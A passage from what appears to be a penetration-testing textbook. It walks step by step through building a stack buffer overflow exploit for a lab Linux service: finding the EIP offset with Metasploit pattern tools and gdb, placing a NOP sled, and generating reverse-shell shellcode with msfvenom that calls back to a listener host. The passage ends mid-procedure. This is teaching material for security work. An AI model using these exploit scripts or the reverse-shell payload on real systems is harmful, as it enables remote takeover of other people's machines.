
![](img/5f597c6a70133069118d9e804ace3775_287_0.png)

Figure 11-2 Using a debugger in one window and our long string in another, we can see that we have overwritten the EIP and EBP.

We now have a classic buffer overflow and have overwritten the EIP. This completes the first step of the exploit development process. Let’s move to the next step.

## Determining the Offset(s)

With control of the EIP, we need to find out exactly how many characters it took to cleanly overwrite it (and nothing more). The easiest way to do this is with Metasploit’s pattern tools.

First, let’s create a shell of a Python script to connect to our listener:

```
#!/usr/bin/python
import socket
total = 1024                                  # Total Length of Buffer String

s = socket.socket()
s.connect(("localhost", 5555))              # Connect to server
print s.recv(1024)                          # Receive Banner
exploit = "A"*total + "\n"                  # Build Exploit String
s.send(exploit)                             # Send Exploit String
s.close
```

When we launch our binary in gdb again and run the Python script in the other window, we should still see our crash. If we do, the Python script is working correctly. Next, we want to figure out exactly how many characters it takes to overflow the buffer. To do this, we can use Metasploit’s pattern_create tool, like so:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B
```

We will add this to our exploit:

```
#!/usr/bin/python
import socket

total = 1024                 # Total Length of Buffer String
sc = ""
sc += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

s = socket.socket()
s.connect(("localhost", 5555))   # Connect to server
print s.recv(1024)               # Receive Banner
exploit = sc                     # Build Exploit String
s.send(exploit)                  # Send Exploit String
s.close
```

Now, when we run the exploit, we get a different overwrite in gdb:

```
Thread 2.1 "ch11_6" received signal SIGSEGV, Segmentation fault.
[Switching to process 14448]
0x41386941 in ?? ()
(gdb)
```

Here, we see 0x41386941, from our pattern, in the EIP. Metasploit's pattern_create tool has a sister tool called pattern_offset. We can put the value from the EIP into pattern_offset to find out where it appeared in our original pattern. This gives us the length of the buffer, as shown here:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1024 -q 0x41386941
[*] Exact match at offset 264
```

We now know that the exact offset is 264 bytes before the EIP will be overwritten. This give us the initial padding length we need before sending our EIP overwrite location. The total exploit should stay 1,024 bytes in size to ensure that offsets don't change while we create the exploit. This should give us plenty of room for a basic reverse shell payload.

## Determining the Attack Vector

Once we know where the EIP is overwritten, we have to determine what address on the stack we need to jump to in order to execute the payload. To do this, we modify our code to add in a NOP sled. This gives us a bigger area to jump to, so that if something minor occurs and our location changes a bit, we will still land somewhere within our NOP instructions. By adding in 32 NOPs, we should overwrite the ESP and have some additional flexibility for addresses to jump to. Remember, any address with "\x00" in it won't work because that is treated as a string termination.

```
#!/usr/bin/python
import socket

total = 1024    # Total Length of Buffer String
off = 264       # Offset to EIP
sc = ""         # Shellcode Block
sc += "A"

noplen = 32     # Length of NOP Sled
jmp = "BBBB"    # Dummy EIP overwrite

s = socket.socket()
s.connect(("localhost", 5555)) # Connect to server
print s.recv(1024)             # Receive Banner
exploit = ""                   # Build Exploit String
exploit += "A"*off + jmp + "\x90"*noplen + sc
exploit += "C"*(total-off-4-len(sc)-noplen)

s.send(exploit)                # Send Exploit String
s.close
```

Once we restart gdb and run our new exploit code, we should see that the EIP is overwritten with the four B's, if our EIP calculations are successful. With the new changes, we should be able to check our stack to see where the NOP sled is:

```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /root/Ch11/ch11_6
[New process 14469]

Thread 2.1 "ch11_6" received signal SIGSEGV, Segmentation fault.
[Switching to process 14469]
①0x42424242 in ?? ()
(gdb) x/32z $esp
②0xbffffff368: 0x90909090 0x90909090 0x90909090 0x90909090
0xbffffff378: 0x90909090 0x90909090 0x90909090 0x90909090
③0xbffffff388: 0x43434341 0x43434343 0x43434343 0x43434343
0xbffffff398: 0x43434343 0x43434343 0x43434343 0x43434343
0xbffffff3a8: 0x43434343 0x43434343 0x43434343 0x43434343
0xbffffff3b8: 0x43434343 0x43434343 0x43434343 0x43434343
0xbffffff3c8: 0x43434343 0x43434343 0x43434343 0x43434343
0xbffffff3d8: 0x43434343 0x43434343 0x43434343 0x43434343
```

We can see that the EIP ① was overwritten. At 0xbffffff368 ②, we see the values are filled with our NOP instructions, so we now have a return address. The final area is the address range following the NOP sled, which is where our C characters lie ③. This is where our shellcode would be dumped; therefore, if we jump into the NOP sled ②, it should lead us directly into our shellcode.

## Building the Exploit

We could build our exploit from scratch, but Metasploit has the ability to do that for us. With msfvenom, we can generate some shellcode that will work in our module. We will use the linux/x86/shell_reverse_tcp module to create a socket attached to a shell that will call back to us on a listener:

```
root@kali:~/book# msfvenom -p linux/x86/shell_reverse_tcp -f python \
LHOST=192.168.192.192 LPORT=8675
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of python file: 342 bytes
buf = ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\xc0\xc0\x68\x02\x00\x21\xe3\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xbb\x03\x89\xe1\xcd\x80\x52\x68\x6e\xe2\x2f\x73"
buf += "\x68\x68\x2f\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"
```

The LHOST and LPORT options are our listening host and listening port, respectively. The -f option says to generate Python code. However, there is a problem with our output.
